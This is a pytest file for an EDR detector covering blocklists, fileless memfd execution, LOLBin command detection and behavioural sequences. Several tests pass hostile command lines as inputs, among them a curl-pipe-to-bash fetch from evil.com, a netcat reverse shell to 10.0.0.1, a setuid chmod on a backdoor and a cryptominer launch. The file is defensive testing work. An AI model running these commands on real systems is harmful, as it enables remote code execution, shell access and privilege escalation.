#!/usr/bin/env python3
"""
Tests for EDR Detector — check_exec pipeline, blocklist, memfd, LOLBins, sequences.
"""

import time
import pytest
from unittest.mock import patch, MagicMock


class TestBlockEngine:
    """Tests for BlockEngine path/hash blocking."""

    def test_check_path_blocked_match(self, mock_store):
        from edr_detector.block_engine import BlockEngine
        mock_store.add_blocked_path("/tmp/malware*")
        engine = BlockEngine(mock_store)
        assert engine.check_path_blocked("/tmp/malware.elf") is True

    def test_check_path_blocked_no_match(self, mock_store):
        from edr_detector.block_engine import BlockEngine
        engine = BlockEngine(mock_store)
        assert engine.check_path_blocked("/usr/bin/ls") is False

    def test_check_path_blocked_exact(self, mock_store):
        from edr_detector.block_engine import BlockEngine
        mock_store.add_blocked_path("/tmp/evil")
        engine = BlockEngine(mock_store)
        assert engine.check_path_blocked("/tmp/evil") is True
        assert engine.check_path_blocked("/tmp/evil2") is False

    def test_check_hash_blocked_match(self, mock_store):
        from edr_detector.block_engine import BlockEngine
        test_hash = "a" * 64
        mock_store.add_blocked_hash(test_hash, "malware", "test")
        engine = BlockEngine(mock_store)
        assert engine.check_hash_blocked(test_hash) is True

    def test_check_hash_blocked_no_match(self, mock_store):
        from edr_detector.block_engine import BlockEngine
        engine = BlockEngine(mock_store)
        assert engine.check_hash_blocked("b" * 64) is False

    def test_get_sha256_file(self, tmp_path, mock_store):
        from edr_detector.block_engine import BlockEngine
        engine = BlockEngine(mock_store)
        # Create a test file
        test_file = tmp_path / "test.bin"
        test_file.write_bytes(b"hello world")
        result = engine.get_sha256(str(test_file))
        assert result is not None
        assert len(result) == 64  # SHA256 hex digest

    def test_get_sha256_nonexistent(self, mock_store):
        from edr_detector.block_engine import BlockEngine
        engine = BlockEngine(mock_store)
        assert engine.get_sha256("/nonexistent/file.bin") is None

    def test_get_sha256_caching(self, tmp_path, mock_store):
        from edr_detector.block_engine import BlockEngine
        engine = BlockEngine(mock_store)
        test_file = tmp_path / "cached.bin"
        test_file.write_bytes(b"test data")
        h1 = engine.get_sha256(str(test_file))
        h2 = engine.get_sha256(str(test_file))
        assert h1 == h2
        assert str(test_file) in engine._hash_cache


class TestFilelessDetection:
    """Tests for memfd/fileless malware detection."""

    def test_memfd_path_detected(self, mock_store):
        from edr_detector.detectors.fileless import check_memfd
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_memfd(
            pid=1234, path="/memfd:evil", comm="exploit",
            auto_block=False, blocker=blocker
        )
        assert result is not None
        assert result["reason"] == "FILELESS_EXEC"
        assert result["mitre_id"] == "T1620"
        assert result["alert_level"] == 3

    def test_proc_self_fd_detected(self, mock_store):
        from edr_detector.detectors.fileless import check_memfd
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_memfd(
            pid=5678, path="/proc/self/fd/3", comm="dropper",
            auto_block=False, blocker=blocker
        )
        assert result is not None
        assert result["reason"] == "FILELESS_EXEC"

    def test_dev_shm_hidden_detected(self, mock_store):
        from edr_detector.detectors.fileless import check_memfd
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_memfd(
            pid=9999, path="/dev/shm/.hidden_malware", comm="miner",
            auto_block=False, blocker=blocker
        )
        assert result is not None

    def test_normal_path_not_detected(self, mock_store):
        from edr_detector.detectors.fileless import check_memfd
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_memfd(
            pid=100, path="/usr/bin/ls", comm="ls",
            auto_block=False, blocker=blocker
        )
        assert result is None

    def test_empty_path_not_detected(self, mock_store):
        from edr_detector.detectors.fileless import check_memfd
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_memfd(
            pid=100, path="", comm="test",
            auto_block=False, blocker=blocker
        )
        assert result is None

    def test_auto_block_kills(self, mock_store):
        from edr_detector.detectors.fileless import check_memfd
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        with patch.object(blocker, 'kill_pid', return_value=True) as mock_kill:
            result = check_memfd(
                pid=1234, path="/memfd:payload", comm="exploit",
                auto_block=True, blocker=blocker
            )
            assert result is not None
            assert result["action"] == "KILL"
            assert result["auto_blocked"] is True
            mock_kill.assert_called_once_with(1234)


class TestLOLBinsDetection:
    """Tests for LOLBins (Living-off-the-Land) detection."""

    def test_curl_pipe_bash_detected(self, mock_store):
        from edr_detector.detectors.lolbins import check_lolbins
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_lolbins(
            pid=100, comm="curl", cmdline="curl http://evil.com/payload.sh | bash",
            path="/usr/bin/curl", policy={"lolbins_whitelist": []},
            auto_block=False, blocker=blocker
        )
        assert result is not None
        assert result["reason"] == "LOLBIN"
        assert "curl" in result["rule"]

    def test_python_reverse_shell_detected(self, mock_store):
        from edr_detector.detectors.lolbins import check_lolbins
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_lolbins(
            pid=200, comm="python3",
            cmdline="python3 -c 'import socket; import subprocess'",
            path="/usr/bin/python3", policy={"lolbins_whitelist": []},
            auto_block=False, blocker=blocker
        )
        assert result is not None
        assert result["reason"] == "LOLBIN"

    def test_netcat_shell_detected(self, mock_store):
        from edr_detector.detectors.lolbins import check_lolbins
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_lolbins(
            pid=300, comm="nc", cmdline="nc -e /bin/sh 10.0.0.1 4444",
            path="/usr/bin/nc", policy={"lolbins_whitelist": []},
            auto_block=False, blocker=blocker
        )
        assert result is not None
        assert result["alert_level"] == 3

    def test_normal_curl_not_detected(self, mock_store):
        from edr_detector.detectors.lolbins import check_lolbins
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_lolbins(
            pid=400, comm="curl", cmdline="curl https://example.com/api",
            path="/usr/bin/curl", policy={"lolbins_whitelist": []},
            auto_block=False, blocker=blocker
        )
        assert result is None

    def test_whitelisted_comm_not_detected(self, mock_store):
        from edr_detector.detectors.lolbins import check_lolbins
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_lolbins(
            pid=500, comm="curl", cmdline="curl http://evil.com | bash",
            path="/usr/bin/curl", policy={"lolbins_whitelist": ["curl"]},
            auto_block=False, blocker=blocker
        )
        assert result is None

    def test_empty_cmdline_not_detected(self, mock_store):
        from edr_detector.detectors.lolbins import check_lolbins
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_lolbins(
            pid=600, comm="curl", cmdline="",
            path="/usr/bin/curl", policy={"lolbins_whitelist": []},
            auto_block=False, blocker=blocker
        )
        assert result is None

    def test_cryptominer_detected(self, mock_store):
        from edr_detector.detectors.lolbins import check_lolbins
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_lolbins(
            pid=700, comm="xmrig", cmdline="xmrig --donate-level 1",
            path="/tmp/xmrig", policy={"lolbins_whitelist": []},
            auto_block=False, blocker=blocker
        )
        assert result is not None
        assert result["alert_level"] == 3

    def test_chmod_suid_detected(self, mock_store):
        from edr_detector.detectors.lolbins import check_lolbins
        from edr_detector.block_engine import BlockEngine
        blocker = BlockEngine(mock_store)
        result = check_lolbins(
            pid=800, comm="chmod", cmdline="chmod +s /tmp/backdoor",
            path="/usr/bin/chmod", policy={"lolbins_whitelist": []},
            auto_block=False, blocker=blocker
        )
        assert result is not None
        assert "T1548" in result.get("mitre_id", "")


class TestSequenceDetection:
    """Tests for behavioral sequence analysis."""

    def test_reverse_shell_sequence(self):
        from edr_detector.detectors.sequence import check_sequences
        now = time.time()
        pid_events = {
            1000: [
                {"time": now - 2, "type": 1, "filename": "/tmp/exploit",
                 "path": "/tmp/exploit"},
                {"time": now - 1, "type": 3, "dst_ip": "10.0.0.1"},
            ]
        }
        result = check_sequences(1000, pid_events)
        assert result is not None
        assert result["reason"] == "BEHAVIOR_SEQUENCE"
        assert result["alert_level"] == 3

    def test_no_sequence_with_normal_events(self):
        from edr_detector.detectors.sequence import check_sequences
        now = time.time()
        pid_events = {
            2000: [
                {"time": now - 1, "type": 1, "filename": "/usr/bin/ls",
                 "path": "/usr/bin/ls"},
            ]
        }
        result = check_sequences(2000, pid_events)
        assert result is None

    def test_expired_events_not_matched(self):
        from edr_detector.detectors.sequence import check_sequences
        now = time.time()
        pid_events = {
            3000: [
                {"time": now - 100, "type": 1, "filename": "/tmp/old",
                 "path": "/tmp/old"},
                {"time": now - 99, "type": 3, "dst_ip": "10.0.0.1"},
            ]
        }
        result = check_sequences(3000, pid_events)
        assert result is None


class TestEDRDetectorFacade:
    """Integration tests for EDRDetector.check_exec()."""

    def test_blocked_path_kills(self, mock_store):
        from edr_detector import EDRDetector
        mock_store.add_blocked_path("/tmp/blocked_binary")
        det = EDRDetector(mock_store)
        with patch('edr_detector.block_engine.BlockEngine.kill_pid', return_value=True):
            result = det.check_exec({
                "pid": 1234, "ppid": 1, "comm": "malware",
                "filename": "/tmp/blocked_binary", "uid": 1000, "cmdline": "./blocked_binary",
            })
        assert result is not None
        assert result["action"] == "KILL"
        assert result["reason"] == "BLOCKED_PATH"

    def test_xdr_own_path_skipped(self, mock_store):
        from edr_detector import EDRDetector
        det = EDRDetector(mock_store)
        result = det.check_exec({
            "pid": 1234, "ppid": 1, "comm": "xdr_engine",
            "filename": "/opt/xdr/xdr-core/xdr_engine.py",
            "uid": 0, "cmdline": "python3 xdr_engine.py",
        })
        assert result is None

    def test_normal_binary_passes(self, mock_store):
        from edr_detector import EDRDetector
        det = EDRDetector(mock_store)
        result = det.check_exec({
            "pid": 5678, "ppid": 1, "comm": "ls",
            "filename": "/usr/bin/ls", "uid": 1000, "cmdline": "ls -la",
        })
        assert result is None
